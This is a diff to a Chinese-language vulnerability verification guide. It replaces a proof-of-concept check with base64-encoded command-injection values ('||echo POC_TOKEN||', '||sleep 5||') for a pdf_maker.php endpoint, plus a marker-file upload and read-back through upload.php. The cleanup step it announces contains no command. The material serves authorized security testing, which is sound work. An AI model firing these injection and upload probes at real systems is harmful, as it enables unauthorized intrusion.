@@ -70,14 +70,30 @@ curl -s "http://target/tools/manage/cmd.php?cmd=id"
 
 ## 验证方法
 
-```bash
-# pdf_maker.php
-curl -s "http://target/inter/pdf_maker.php" \
-  -d "url=fHxpZHx8&fileName=dGVzdA=="
+方式一（命令执行）：把 `url` 参数换成 `||echo POC_TOKEN||` 的 base64，判据是响应体里出现本次这个串。
 
-# upload.php
-curl -s "http://target/tools/manage/upload.php" -o /dev/null -w "%{http_code}"
+```bash
+# echo -n '||echo POC_TOKEN||' | base64
+curl -s "http://target/inter/pdf_maker.php" \
+  -d "url=fHxlY2hvIFBPQ19UT0tFTnx8&fileName=dGVzdA=="
 ```
+
+判据：响应体里出现 `POC_TOKEN`。命令无回显时改用时间盲注：`url` 换成 `||sleep 5||` 的 base64（`fHxzbGVlcCA1fHw=`），耗时比基线多约 5 秒。注意本次请求用的就是这个接口和这个参数；验证不得改写成 `whoami` / `id` 之类。
+
+方式二（文件上传）：上传一个只含标记串的纯文本文件，GET 回读，再删。
+
+```bash
+printf 'POC_TOKEN' > poc-POC_TOKEN.txt
+curl -s "http://target/tools/manage/upload.php" \
+  -F "file=@poc-POC_TOKEN.txt;filename=poc-POC_TOKEN.txt"
+
+# 回读：响应体出现 POC_TOKEN 即上传通道可用
+curl -s "http://target/tools/manage/poc-POC_TOKEN.txt" | grep "POC_TOKEN"
+
+# 清理上传的标记文件
+```
+
+反例：`upload.php` 返回 200 或 `pdf_maker.php` 返回任意 HTML，但两者响应里都没有本次的 `POC_TOKEN` —— 只是接口接受请求，命令执行/上传不成立。
 
 ## 指纹确认
 
